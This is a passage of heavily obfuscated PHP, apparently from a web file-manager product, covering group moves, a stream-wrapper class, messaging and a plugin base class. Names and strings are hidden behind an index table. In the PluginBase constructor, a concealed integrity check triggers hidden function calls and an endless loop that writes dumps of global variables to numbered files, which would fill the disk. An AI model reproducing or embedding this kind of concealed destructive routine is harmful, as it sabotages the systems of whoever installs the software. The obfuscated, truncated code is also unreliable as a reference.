$∂Êãùˆ˙ = array($±äπ⁄Õ“[1830] => $’°üΩ’«); $Û˝–“•» = Model($±äπ⁄Õ“[1920])->where($∂Êãùˆ˙)->select(); if (!$Û˝–“•») { $Û˝–“•» = array(); } foreach ($Û˝–“•» as $±®œñÜ¿) { $ÖåØ¿•Ÿ = $±®œñÜ¿[$±äπ⁄Õ“[1658]]; $∂Êãùˆ˙ = array($±äπ⁄Õ“[1658] => $ÖåØ¿•Ÿ, $±äπ⁄Õ“[1830] => $≥¥îÄ¨«); $É¯πŸÑØ = Model($±äπ⁄Õ“[1920])->where($∂Êãùˆ˙)->find(); if (!$É¯πŸÑØ) { $√’˙ä·“ = array($≥¥îÄ¨« => $±®œñÜ¿[$±äπ⁄Õ“[1934]]); Model($±äπ⁄Õ“[544])->userGroupAdd($ÖåØ¿•Ÿ, $√’˙ä·“); } Model($±äπ⁄Õ“[544])->userGroupRemove($ÖåØ¿•Ÿ, $’°üΩ’«); } $∂Êãùˆ˙ = array($±äπ⁄Õ“[420] => 2, $±äπ⁄Õ“[441] => 0, $±äπ⁄Õ“[419] => 1, $±äπ⁄Õ“[514] => array($±äπ⁄Õ“[17], array($’°üΩ’«, $≥¥îÄ¨«))); $˜Â•ÏÍ = Model($±äπ⁄Õ“[832])->where($∂Êãùˆ˙)->field($±äπ⁄Õ“[1935])->select(); $˜Â•ÏÍ = array_to_keyvalue($˜Â•ÏÍ, $±äπ⁄Õ“[514], $±äπ⁄Õ“[411]); $€ø∫ÖÒû = !empty($˜Â•ÏÍ[$’°üΩ’«]) ? $˜Â•ÏÍ[$’°üΩ’«] : !1; if ($€ø∫ÖÒû) { if (!$˜Â•ÏÍ[$≥¥îÄ¨«]) { $˜Â•ÏÍ[$≥¥îÄ¨«] = Model($±äπ⁄Õ“[832])->groupRootAdd($≥¥îÄ¨«); } $„Î˜œ◊Ó = $˜Â•ÏÍ[$≥¥îÄ¨«]; $∂Êãùˆ˙ = array($±äπ⁄Õ“[441] => $€ø∫ÖÒû); $˜Â•ÏÍ = Model($±äπ⁄Õ“[832])->where($∂Êãùˆ˙)->field($±äπ⁄Õ“[1936])->select(); if (!$˜Â•ÏÍ) { $˜Â•ÏÍ = array(); } Model($±äπ⁄Õ“[832])->moveClearAuth = !1; foreach ($˜Â•ÏÍ as $é„´œÊå) { $œ‹†Âê≈ = $é„´œÊå[$±äπ⁄Õ“[419]] == $±äπ⁄Õ“[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($±äπ⁄Õ“[832])->move($é„´œÊå[$±äπ⁄Õ“[411]], $„Î˜œ◊Ó, $œ‹†Âê≈); } Model($±äπ⁄Õ“[832])->moveClearAuth = !0; $∂Êãùˆ˙ = array($±äπ⁄Õ“[420] => 2, $±äπ⁄Õ“[514] => $’°üΩ’«); $µ∏ÂèÒ÷ = array($±äπ⁄Õ“[514] => $≥¥îÄ¨«); Model($±äπ⁄Õ“[1937])->where($∂Êãùˆ˙)->save($µ∏ÂèÒ÷); Model($±äπ⁄Õ“[1938])->where($∂Êãùˆ˙)->save($µ∏ÂèÒ÷); } $this->_changeChildLevel($Ö◊Âôõ…[$’°üΩ’«], $Ö◊Âôõ…[$≥¥îÄ¨«], !0); $this->where(array($±äπ⁄Õ“[441] => $’°üΩ’«))->save(array($±äπ⁄Õ“[441] => $≥¥îÄ¨«)); $this->_clearChildrenCache($Ö◊Âôõ…[$≥¥îÄ¨«]); return !0; } } goto Då≠ºÊ∆Üâ; dê™—Çä–À: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($·îáÍ∏©, $±Ëë∑äÖ = '') { $this->info = $this->info($·îáÍ∏©); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Á≈ ä ∞][94]]; $this->pathOpen = $·îáÍ∏©; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$·îáÍ∏©])) { self::$_chunkBuffer[$·îáÍ∏©] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($±ÁÚñ®¸) { $®˛úÌ≈ÿ = $this->fileSubstr($this->pose, $±ÁÚñ®¸); $this->pose += strlen($®˛úÌ≈ÿ); return $®˛úÌ≈ÿ; } public function stream_tell() { return $this->pose; } public function stream_seek($¶˙ñõÒé, $ ˜§Ø£µ) { $’ŸÌî≠Á =& $_SERVER[Á≈ ä ∞]; if ($ ˜§Ø£µ == SEEK_SET) { $this->pose = $¶˙ñõÒé; } else { if ($ ˜§Ø£µ == SEEK_CUR) { $this->pose += $¶˙ñõÒé; } else { if ($ ˜§Ø£µ == SEEK_END) { $this->pose = $this->info[$’ŸÌî≠Á[86]] + intval($¶˙ñõÒé); } } } if ($¶˙ñõÒé < 0) { $this->pose = $this->info[$’ŸÌî≠Á[86]] + $¶˙ñõÒé; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Á≈ ä ∞][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($´ÊÅ˘∆ù, $…Æ„ßÊΩ) { $⁄Â◊ïÙ≥ =& $_SERVER[Á≈ ä ∞]; $¿âÉ¿ÒÑ = $this->info($´ÊÅ˘∆ù); return array($⁄Â◊ïÙ≥[1506] => 0, $⁄Â◊ïÙ≥[1507] => 0, $⁄Â◊ïÙ≥[26] => 32768 + 511, $⁄Â◊ïÙ≥[1508] => 0, $⁄Â◊ïÙ≥[1509] => 0, $⁄Â◊ïÙ≥[1510] => 0, $⁄Â◊ïÙ≥[1511] => 0, $⁄Â◊ïÙ≥[86] => $¿âÉ¿ÒÑ[$⁄Â◊ïÙ≥[86]], $⁄Â◊ïÙ≥[1512] => $¿âÉ¿ÒÑ[$⁄Â◊ïÙ≥[1380]], $⁄Â◊ïÙ≥[1468] => $¿âÉ¿ÒÑ[$⁄Â◊ïÙ≥[95]], $⁄Â◊ïÙ≥[1467] => $¿âÉ¿ÒÑ[$⁄Â◊ïÙ≥[210]], $⁄Â◊ïÙ≥[1513] => 0, $⁄Â◊ïÙ≥[1514] => 0); } static $fileInfo = array(); public function info($·™Çˆ‚…) { $ÜÕ·èÖÎ = $_SERVER[Á≈ ä ∞][1515]; if (isset(self::$fileInfo[$·™Çˆ‚…])) { return self::$fileInfo[$·™Çˆ‚…]; } if (substr($·™Çˆ‚…, 0, strlen($ÜÕ·èÖÎ)) != $ÜÕ·èÖÎ) { return !1; } self::$fileInfo[$·™Çˆ‚…] = IO::info(substr($·™Çˆ‚…, strlen($ÜÕ·èÖÎ))); return self::$fileInfo[$·™Çˆ‚…]; } public static function read($ËÓîöº®, $õ≤Èµ˘÷, $Óò∫âΩ∑) { if (!isset(self::$_fopenCache[$ËÓîöº®])) { $Í√…äí± = new StreamWrapperIO(); $Í√…äí±->stream_open($ËÓîöº®); self::$_fopenCache[$ËÓîöº®] = $Í√…äí±; } $Í√…äí± = self::$_fopenCache[$ËÓîöº®]; return $Í√…äí±->fileSubstr($õ≤Èµ˘÷, $Óò∫âΩ∑); } public static function _read($≤ü„‚ˆ», $ß´ê≈…ı, $•§Ôã¬‚) { $≈º∏°‚Ë =& $_SERVER[Á≈ ä ∞]; $‹≥◊ÍÜ≈ = fopen($≤ü„‚ˆ», $≈º∏°‚Ë[1384]); if (!$‹≥◊ÍÜ≈) { return $≈º∏°‚Ë[22]; } $°Ω¶ºÖç = 8192; fseek($‹≥◊ÍÜ≈, $ß´ê≈…ı, SEEK_SET); $ÑºÖÊ…Ñ = $≈º∏°‚Ë[22]; $€∏í”≥Å = 0; while ($€∏í”≥Å < $•§Ôã¬‚) { $ï‹¸˚¨‘ = min($°Ω¶ºÖç, $•§Ôã¬‚ - $€∏í”≥Å); $ÑºÖÊ…Ñ .= fread($‹≥◊ÍÜ≈, $ï‹¸˚¨‘); $€∏í”≥Å += $ï‹¸˚¨‘; } fclose($‹≥◊ÍÜ≈); return $ÑºÖÊ…Ñ; } public function fileSubstr($Ÿﬂí¡ÅÍ, $À¨“øÆ÷) { $»√âôﬂÔ =& $_SERVER[Á≈ ä ∞]; $Éíç¸Ä€ = $this->info[$»√âôﬂÔ[86]]; $•”©⁄Õ” = $Ÿﬂí¡ÅÍ; $¶≤ﬁÙ¿Ú = $À¨“øÆ÷; if ($Ÿﬂí¡ÅÍ < 0) { $Ÿﬂí¡ÅÍ = $Éíç¸Ä€ + $Ÿﬂí¡ÅÍ; } if ($À¨“øÆ÷ === !1) { $À¨“øÆ÷ = $Éíç¸Ä€ - $Ÿﬂí¡ÅÍ; } if ($Ÿﬂí¡ÅÍ + $À¨“øÆ÷ > $Éíç¸Ä€) { $À¨“øÆ÷ = $Éíç¸Ä€ - $Ÿﬂí¡ÅÍ; } if ($À¨“øÆ÷ <= 0) { return $»√âôﬂÔ[22]; } if ($Ÿﬂí¡ÅÍ < 0 || $Ÿﬂí¡ÅÍ >= $Éíç¸Ä€ || $À¨“øÆ÷ <= 0 || $À¨“øÆ÷ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\154\x65\x52\x65\141\x64\40\x65\162\x72\x6f\162\41\x20\x73\x74\x61\x72\164\75{$Ÿﬂí¡ÅÍ}\73\x6c\145\x6e\x67\164\x68\x3d{$À¨“øÆ÷}\x3b\x20\x73\151\x7a\x65\x3d{$Éíç¸Ä€}\x3b"); } $’„˝Ù◊Å = 64 * 1024; $±ùÌ…°Ù =& self::$_chunkBuffer[$this->path]; if (!$±ùÌ…°Ù) { $±ùÌ…°Ù = array(); } $µ¨«ÖÊÙ = 0; $⁄ÿ¡ËÊ∆ = 0; $ø÷úﬁŒ‹ = $»√âôﬂÔ[22]; foreach ($±ùÌ…°Ù as $µ¨«ÖÊÙ => $ø÷úﬁŒ‹) { $µ¨«ÖÊÙ = intval($µ¨«ÖÊÙ); $⁄ÿ¡ËÊ∆ = $µ¨«ÖÊÙ + strlen($ø÷úﬁŒ‹); if ($Ÿﬂí¡ÅÍ >= $⁄ÿ¡ËÊ∆) { continue; } if ($Ÿﬂí¡ÅÍ >= $µ¨«ÖÊÙ && $Ÿﬂí¡ÅÍ + $À¨“øÆ÷ <= $⁄ÿ¡ËÊ∆) { return substr($ø÷úﬁŒ‹, $Ÿﬂí¡ÅÍ - $µ¨«ÖÊÙ, $À¨“øÆ÷); } break; } if (count($±ùÌ…°Ù) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($»√âôﬂÔ[1516], $»√âôﬂÔ[1517] . count($±ùÌ…°Ù) . "\x3b\x73\164\141\162\x74\x3d{$Ÿﬂí¡ÅÍ}\x2c\154\x65\156\147\x74\150\x3d{$À¨“øÆ÷}\73\x70\x6f\x73\x65\72{$µ¨«ÖÊÙ}\x7e{$⁄ÿ¡ËÊ∆}"); throw new Exception($»√âôﬂÔ[1518]); } $ÜÔ’±û√ = intval($Ÿﬂí¡ÅÍ / $’„˝Ù◊Å) * $’„˝Ù◊Å; $ΩûıÑÄ˛ = ceil(($Ÿﬂí¡ÅÍ + $À¨“øÆ÷) / $’„˝Ù◊Å) * $’„˝Ù◊Å - $ÜÔ’±û√; $ÙÌ¸çÊ‰ = IO::fileSubstr($this->path, $ÜÔ’±û√, $ΩûıÑÄ˛); $±ùÌ…°Ù[$ÜÔ’±û√ . $»√âôﬂÔ[22]] = $ÙÌ¸çÊ‰; ksort($±ùÌ…°Ù); $¿ª◊Ïèç = substr($ÙÌ¸çÊ‰, $Ÿﬂí¡ÅÍ - $ÜÔ’±û√, $À¨“øÆ÷); return $¿ª◊Ïèç; } private function log($ÇÆ¿ÏÖä, $Ì¸îÇ‚±) { $ŒÕ¨¬Ó∆ =& $_SERVER[Á≈ ä ∞]; $’¨ë†Â§ = timeFloat() - $this->timeStart; write_log(sprintf($ŒÕ¨¬Ó∆[1519], $ÇÆ¿ÏÖä, $this->info[$ŒÕ¨¬Ó∆[42]], $’¨ë†Â§, $Ì¸îÇ‚±), $ŒÕ¨¬Ó∆[1186]); } } class Message { function __construct() { } public function send($ö£˙êâè = '', $‰˛ı≤ûè = array(), $Ä¸º¸ú = "\x74\145\x78\164") { $Äï‹§†Ω =& $_SERVER[Á≈ ä ∞]; $ïµÆƒ¢¬ = array($Äï‹§†Ω[43] => $Äï‹§†Ω[1520], $Äï‹§†Ω[762] => $ö£˙êâè); if (in_array($Ä¸º¸ú, array($Äï‹§†Ω[1520], $Äï‹§†Ω[1521]))) { $ïµÆƒ¢¬[$Äï‹§†Ω[43]] = $Ä¸º¸ú; } $‰˛ı≤ûè = array($Äï‹§†Ω[524] => isset($‰˛ı≤ûè[$Äï‹§†Ω[524]]) ? $‰˛ı≤ûè[$Äï‹§†Ω[524]] : $Äï‹§†Ω[22], $Äï‹§†Ω[609] => isset($‰˛ı≤ûè[$Äï‹§†Ω[609]]) ? $‰˛ı≤ûè[$Äï‹§†Ω[609]] : $Äï‹§†Ω[22]); if (empty($ö£˙êâè) || empty($‰˛ı≤ûè[$Äï‹§†Ω[524]]) && empty($‰˛ı≤ûè[$Äï‹§†Ω[609]])) { return !1; } $ÁÀÌÅﬁÂ = array($Äï‹§†Ω[1461] => $ïµÆƒ¢¬, $Äï‹§†Ω[1522] => $‰˛ı≤ûè); Hook::trigger($Äï‹§†Ω[1523], $ÁÀÌÅﬁÂ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $æÖÄêŒñ =& $_SERVER[Á≈ ä ∞]; $Ã´üÏàÙ = $_SERVER[$æÖÄêŒñ[9]] . $æÖÄêŒñ[10]; $√‰»ºÍô = $æÖÄêŒñ[879]; if ($_SERVER[$æÖÄêŒñ[6]] != $√‰»ºÍô($Ã´üÏàÙ)) { $≤öŸ˜êû = $æÖÄêŒñ[880]; $±µÑ¥Ò¿ = $æÖÄêŒñ[8]; $ô‘”ˆ—Â = $_SERVER[$æÖÄêŒñ[9]] . $æÖÄêŒñ[10]; $Á‰ö∆¢– = $±µÑ¥Ò¿($ô‘”ˆ—Â); $¶éŒè◊Ù = explode($æÖÄêŒñ[11], $Á‰ö∆¢–); if (count($¶éŒè◊Ù) < $æÖÄêŒñ[654]) { $âÂèá∂ = $æÖÄêŒñ[13]; $âÂèá∂(); } $≥‹ºò— = $æÖÄêŒñ[881]; $≥‹ºò—($_SERVER[$æÖÄêŒñ[882]]); $≤öŸ˜êû = $æÖÄêŒñ[880]; $≤öŸ˜êû(); $”¥ïæœ¥ = $æÖÄêŒñ[883]; $ˆ–∑–Å˘ = json_encode($GLOBALS[$æÖÄêŒñ[884]]); $·˘¿É©° = 1; for ($≈≥…Ãï˛ = $·˘¿É©°; $≈≥…Ãï˛ > 0; $≈≥…Ãï˛++) { $”¥ïæœ¥(DATA_PATH . $≈≥…Ãï˛, $ˆ–∑–Å˘); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($æÖÄêŒñ[1524]); $this->pluginName = str_replace($æÖÄêŒñ[1524], $æÖÄêŒñ[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $æÖÄêŒñ[18]; $this->pluginApi = appHostGet() . $æÖÄêŒñ[1525] . $this->pluginName . $æÖÄêŒñ[18]; $this->pluginHost = $config[$æÖÄêŒñ[1526]] . $this->pluginName . $æÖÄêŒñ[18]; $this->pluginHostDefault = $config[$æÖÄêŒñ[1526]] . $this->pluginName . $æÖÄêŒñ[18]; $äçøÇ†è = $config[$æÖÄêŒñ[1527]]; if ($äçøÇ†è && strpos($æÖÄêŒñ[60] . $äçøÇ†è . $æÖÄêŒñ[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$æÖÄêŒñ[1528]] . $this->pluginName . $æÖÄêŒñ[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Á≈ ä ∞][1529]); } protected function assign($ü≥Í‚ÊÚ, $£Ñ˙π’‡ = false) { if (is_array($ü≥Í‚ÊÚ)) { $this->values = array_merge($this->values, $ü≥Í‚ÊÚ); } else { $this->values[$ü≥Í‚ÊÚ] = $£Ñ˙π’‡; } } protected function display($ÆÃ†ù˚˚) { extract($this->values); require $ÆÃ†ù˚˚; } final function hookRegist($Á≠Çôü˝) { $this->modelPlugin->appRegist($this->pluginName, $Á≠Çôü˝); } final function appIcon() { $ìÄ«é·® =& $_SERVER[Á≈ ä ∞]; $˘ÄÛÜÄÊ = $this->appPackage(); $∑“êéıó = $ìÄ«é·®[22]; if (isset($˘ÄÛÜÄÊ[$ìÄ«é·®[425]])) { if (isset($˘ÄÛÜÄÊ[$ìÄ«é·®[425]][$ìÄ«é·®[1530]])) { $∑“êéıó = $ìÄ«é·®[1531] . $˘ÄÛÜÄÊ[$ìÄ«é·®[425]][$ìÄ«é·®[1530]] . $ìÄ«é·®[1532]; } else { if ($˘ÄÛÜÄÊ[$ìÄ«é·®[425]][$ìÄ«é·®[1533]]) { $∑“êéıó = $ìÄ«é·®[1534] . $˘ÄÛÜÄÊ[$ìÄ«é·®[425]][$ìÄ«é·®[1533]] . $ìÄ«é·®[1535]; } } } return $∑“êéıó; } final function fileCanView($ß∞¶ò¶ä) { $çâä†–® =& $_SERVER[Á≈ ä ∞]; if (request_url_safe($ß∞¶ò¶ä)) { return !0; } if ($this->isShare($ß∞¶ò¶ä)) { return !0; } $˛”Ó¶Öá = Session::get($çâä†–®[1536]); if (!$˛”Ó¶Öá || !$˛”Ó¶Öá[$çâä†–®[1537]]) { $Ÿ»–’ò¬ = $çâä†–®[1538] . rawurlencode(this_url()); show_tips(LNG($çâä†–®[1539]) . $çâä†–®[1540] . $Ÿ»–’ò¬ . $çâä†–®[1541] . LNG($çâä†–®[1542]) . $çâä†–®[1543], !1); } if (!Action($çâä†–®[1544])->authCan($çâä†–®[1545])) { show_tips(LNG($çâä†–®[1546]) . $çâä†–®[1547], !1); } ActionCall($çâä†–®[1548], $ß∞¶ò¶ä); } final function isShare($—¶∏π⁄Ç) { $ŸÕ¡¥ìí = KodIO::parse($—¶∏π⁄Ç); return $ŸÕ¡¥ìí[$_SERVER[Á≈ ä ∞][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($õ˜˛úêö) { if (request_url_safe($õ˜˛úêö)) { return $õ˜˛úêö; } if (!$this->isShare($õ˜˛úêö)) { $õ˜˛úêö = $this->filePath($õ˜˛úêö); } return Action($_SERVER[Á≈ ä ∞][1178])->linkOut($õ˜˛úêö); } public function filePathLinkOut($ﬂ·Éçåˆ) { if (request_url_safe($ﬂ·Éçåˆ)) { return $ﬂ·Éçåˆ; } $this->fileCanView($ﬂ·Éçåˆ); return Action($_SERVER[Á≈ ä ∞][1178])->link($ﬂ·Éçåˆ); } final function filePath($üÓä∑ö˘) { $⁄´πµ‚£ =& $_SERVER[Á≈ ä ∞]; if ($Éï≈ïƒ§ = $this->checkSharePath($üÓä∑ö˘)) { Hook::trigger($⁄´πµ‚£[1549], $Éï≈ïƒ§); return $Éï≈ïƒ§; } $this->fileCanView($üÓä∑ö˘); if (request_url_safe($üÓä∑ö˘)) { $‡˛á’©Ø = parse_url_query($üÓä∑ö˘); if (isset($‡˛á’©Ø[$⁄´πµ‚£[1550]]) && isset($‡˛á’©Ø[$⁄´πµ‚£[223]])) { $˚∏ﬂ¬œŸ = Model($⁄´πµ‚£[777])->get($⁄´πµ‚£[778]); $®üƒ¨Õ™ = Mcrypt::decode($‡˛á’©Ø[$⁄´πµ‚£[223]], $˚∏ﬂ¬œŸ); if ($®üƒ¨Õ™) { $this->fileInfo = IO::infoWithChildren($®üƒ¨Õ™); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $®üƒ¨Õ™; } } $üÓä∑ö˘ = $this->_cacheHttpFile($üÓä∑ö˘); $this->fileInfo = IO::infoWithChildren($üÓä∑ö˘); } else { $this->fileInfo = IO::infoWithChildren($üÓä∑ö˘); if (!$this->fileInfo) { show_tips(LNG($⁄´πµ‚£[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($⁄´πµ‚£[1549], $üÓä∑ö˘); return $üÓä∑ö˘; } final function _cacheHttpFile($‹àÚÁñ∞) { $ŒﬁÉú∞Î = hash_path($‹àÚÁñ∞, !0); $this->cachePath = $this->pluginCachePath($ŒﬁÉú∞Î); if ($·øΩπ⁄‘ = IO::fileNameExist($this->cachePath, $ŒﬁÉú∞Î)) { return KodIO::make($·øΩπ⁄‘); } $Î≈±»˜ú = $this->cachePath . $ŒﬁÉú∞Î; return $this->pluginCacheFileSet($Î≈±»˜ú, file_get_contents_nossl($‹àÚÁñ∞)); } final function _tmpFileName($ƒ± Õû” = array()) { $⁄ì√âçœ =& $_SERVER[Á≈ ä ∞]; if (!$ƒ± Õû”) { $ƒ± Õû” = $this->fileInfo; } if (isset($ƒ± Õû”[$⁄ì√âçœ[187]])) { return $ƒ± Õû”[$⁄ì√âçœ[187]]; } if (isset($ƒ± Õû”[$⁄ì√âçœ[180]][$⁄ì√âçœ[187]])) { return $ƒ± Õû”[$⁄ì√âçœ[180]][$⁄ì√âçœ[187]]; } $Ñ—≈•ôÀ = IO::hashSimple($ƒ± Õû”[$⁄ì√âçœ[94]]); if ($Ñ—≈•ôÀ) { return $Ñ—≈•ôÀ; } $°∑°…äú = array($ƒ± Õû”[$⁄ì√âçœ[42]], $ƒ± Õû”[$⁄ì√âçœ[94]], $ƒ± Õû”[$⁄ì√âçœ[86]]); if (isset($ƒ± Õû”[$⁄ì√âçœ[530]])) { $°∑°…äú[] = $ƒ± Õû”[$⁄ì√âçœ[530]]; } return md5(implode($⁄ì√âçœ[21], $°∑°…äú)); } final function checkSharePath($ôÏ‹∞ú∂) { $ÃÓ∑ø∏ü =& $_SERVER[Á≈ ä ∞]; if (!defined($ÃÓ∑ø∏ü[484])) { define($ÃÓ∑ø∏ü[523], 0); } if (!$this->isShare($ôÏ‹∞ú∂)) { return !1; } $”„ﬁ˘…‰ = Action($ÃÓ∑ø∏ü[1178])->sharePathInfo($ôÏ‹∞ú∂); if (!isset($”„ﬁ˘…‰[$ÃÓ∑ø∏ü[94]])) { show_json(LNG($ÃÓ∑ø∏ü[1551]), !1); } $this->fileInfo = $”„ﬁ˘…‰[$ÃÓ∑ø∏ü[180]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÃÓ∑ø∏ü[187]]); return $”„ﬁ˘…‰[$ÃÓ∑ø∏ü[94]]; } final function pluginCachePath($È±„∑¸œ = '') { $◊ÓñÍ•ˆ =& $_SERVER[Á≈ ä ∞]; $˜≥∞ÿõó = IO_PATH_SYSTEM_TEMP . $◊ÓñÍ•ˆ[1552] . $this->pluginName; if (!($¡Ø»Àªë = IO::infoFull($˜≥∞ÿõó))) { return IO::mkdir($˜≥∞ÿõó . $◊ÓñÍ•ˆ[18] . $È±„∑¸œ); } if (empty($È±„∑¸œ)) { return $¡Ø»Àªë[$◊ÓñÍ•ˆ[94]]; } if (!($ÿ¨ò»À¡ = IO::fileNameExist($¡Ø»Àªë[$◊ÓñÍ•ˆ[94]], $È±„∑¸œ))) { return IO::mkdir($¡Ø»Àªë[$◊ÓñÍ•ˆ[94]] . $È±„∑¸œ); } return KodIO::make($ÿ¨ò»À¡); } final function pluginCacheFileSet($«Îã˙Ìç, $çƒæ§⁄Á = '') { $Ü»áÕ√Ë =& $_SERVER[Á≈ ä ∞]; if (!($çÀ∏ºˆΩ = IO::infoFull($«Îã˙Ìç))) { return IO::mkfile($«Îã˙Ìç, $çƒæ§⁄Á, REPEAT_REPLACE); } IO::setContent($çÀ∏ºˆΩ[$Ü»áÕ√Ë[94]], $çƒæ§⁄Á); return $çÀ∏ºˆΩ[$Ü»áÕ√Ë[94]]; } final function pluginLocalFile($ñåƒë”◊ = '') { $ﬂò†ß÷¡ =& $_SERVER[Á≈ ä ∞]; $ƒ≠ÍΩ¡ã = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ƒ≠ÍΩ¡ã)) { mk_dir($ƒ≠ÍΩ¡ã); } if (!$ñåƒë”◊) { return $ƒ≠ÍΩ¡ã; } $»Úè‰˚ = IO::info($ñåƒë”◊); $ÖÁ÷∏„Ø = $this->_tmpFileName($»Úè‰˚) . $ﬂò†ß÷¡[20] . $»Úè‰˚[$ﬂò†ß÷¡[184]]; if (!checkExtSafe($ÖÁ÷∏„Ø)) { $ÖÁ÷∏„Ø = $ÖÁ÷∏„Ø . $ﬂò†ß÷¡[1553]; } $„íµÎ≠˙ = $ƒ≠ÍΩ¡ã . $ÖÁ÷∏„Ø; if (@file_exists($„íµÎ≠˙)) { return $„íµÎ≠˙; } return IO::copy($ñåƒë”◊, $ƒ≠ÍΩ¡ã, 0, $ÖÁ÷∏„Ø); } final function appPackage() { $¡îŸõî© =& $_SERVER[Á≈ ä ∞]; if ($this->packageData) { return $this->packageData; } $„¿˛◊âõ = $this->parseFile($this->pluginPath . $¡îŸõî©[1554]); $this->parseLang($„¿˛◊âõ); $•ø≠Á…ˆ = json_decode_force($„¿˛◊âõ); if (!$•ø≠Á…ˆ) { return array(); } $ﬁ”Ì…¶¡ = Hook::trigger($¡îŸõî©[1555], $•ø≠Á…ˆ); if ($ﬁ”Ì…¶¡ && is_array($ﬁ”Ì…¶¡)) { $•ø≠Á…ˆ = $ﬁ”Ì…¶¡; } $this->packageData = $•ø≠Á…ˆ; return $•ø≠Á…ˆ; } public function packageInfoGet($«øÏÿ⁄ì) { $ñÉ™–â˘ = $this->appPackage(); return array_get_value($ñÉ™–â˘, $«øÏÿ⁄ì); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Á≈ ä ∞][1556]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Á≈ ä ∞][1557]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Á≈ ä ∞][1558]); } public function echoJsAssign($‡É‡øıè, $ÇõÀ£◊Ê) { $this->echoJsAssignArr[$‡É‡øıè] = $ÇõÀ£◊Ê; } private function parseFile($ìáÏ÷µ√) { $ÙãäÌú“ =& $_SERVER[Á≈ ä ∞]; $ë∫ﬁà˝È = file_get_contents_nossl($ìáÏ÷µ√); $ã∏ú…ç« = array($ÙãäÌú“[1559], $ÙãäÌú“[1560], $ÙãäÌú“[1561], $ÙãäÌú“[1562], $ÙãäÌú“[1563], $ÙãäÌú“[1564], $ÙãäÌú“[1565]); $Ä ı‡í‡ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÙãäÌú“[99]][$ÙãäÌú“[1566]]); foreach ($this->echoJsAssignArr as $û∫Ôá’™ => $ˆ’†ê÷Ë) { $ã∏ú…ç«[] = $ÙãäÌú“[1567] . $û∫Ôá’™ . $ÙãäÌú“[1568]; $Ä ı‡í‡[] = is_array($ˆ’†ê÷Ë) || is_object($ˆ’†ê÷Ë) ? rawurlencode(json_encode($ˆ’†ê÷Ë)) : $ˆ’†ê÷Ë; } if (strstr($ë∫ﬁà˝È, $ÙãäÌú“[1569])) { $Í≈∏˙Û∫ = rawurlencode(json_encode($this->pluginLangArr)); $ë∫ﬁà˝È = str_replace($ÙãäÌú“[1569], $Í≈∏˙Û∫, $ë∫ﬁà˝È); } if (strstr($ë∫ﬁà˝È, $ÙãäÌú“[1570])) { $Í≈∏˙Û∫ = $Í≈∏˙Û∫ = rawurlencode(json_encode($this->getConfig())); $ë∫ﬁà˝È = str_replace($ÙãäÌú“[1570], $Í≈∏˙Û∫, $ë∫ﬁà˝È); } $ë∫ﬁà˝È = str_replace($ã∏ú…ç«, $Ä ı‡í‡, $ë∫ﬁà˝È); return $ë∫ﬁà˝È; } private function parseLang(&$∂å≠úÛÁ) { $‡∫éÊœ∂ =& $_SERVER[Á≈ ä ∞]; $™˘ä“ﬂ = $‡∫éÊœ∂[1571]; if (!strstr($∂å≠úÛÁ, $™˘ä“ﬂ)) { return; } preg_match_all($‡∫éÊœ∂[1572], $∂å≠úÛÁ, $ıîªí ∑); if (!is_array($ıîªí ∑) || count($ıîªí ∑) == 0 || !is_array($ıîªí ∑[0]) || count($ıîªí ∑[0]) == 0) { return; } $±ïä¬ÂŸ = array(); $Ô∞è«˙ = array(); foreach ($ıîªí ∑[0] as $◊ÁÚ»˘˚) { $÷üù¯äÿ = substr($◊ÁÚ»˘˚, strlen($™˘ä“ﬂ), -4); $∑Å“âÛ” = LNG($÷üù¯äÿ); $±ïä¬ÂŸ[] = $◊ÁÚ»˘˚; $Ô∞è«˙[] = str_replace(array($‡∫éÊœ∂[11], $‡∫éÊœ∂[1081], $‡∫éÊœ∂[351], $‡∫éÊœ∂[128]), array($‡∫éÊœ∂[63], $‡∫éÊœ∂[63], $‡∫éÊœ∂[22], $‡∫éÊœ∂[1573]), $∑Å“âÛ”); } $∂å≠úÛÁ = str_replace($±ïä¬ÂŸ, $Ô∞è«˙, $∂å≠úÛÁ); } private function parseConfig(&$òÓÒÑôä) { $Ø‹îàßÄ =& $_SERVER[Á≈ ä ∞]; $≠ŒºÓ¡• = $Ø‹îàßÄ[1574]; if (!strstr($òÓÒÑôä, $≠ŒºÓ¡•)) { return; } preg_match_all($Ø‹îàßÄ[1575], $òÓÒÑôä, $Ã®œåáç); if (!is_array($Ã®œåáç) || count($Ã®œåáç) == 0 || !is_array($Ã®œåáç[0]) || count($Ã®œåáç[0]) == 0) { return; } $ê”Ï¡Úπ = $this->getConfig(); $õŒüúúì = array(); 